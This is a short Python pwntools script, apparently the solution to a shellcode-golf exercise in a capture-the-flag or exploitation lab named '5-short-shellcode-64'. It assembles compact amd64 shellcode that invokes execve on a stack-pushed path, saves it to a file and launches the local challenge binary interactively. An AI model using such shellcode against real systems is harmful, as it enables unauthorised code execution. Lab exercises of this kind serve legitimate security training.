#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, process

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"


shellcode = asm(
    """
cltd
mov     al, 0x3b
push    0x41
push    rsp
pop     rdi
xor     rsi, rsi
syscall
"""
)

print(shellcode, len(shellcode))
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./5-short-shellcode-64"])
io.interactive()
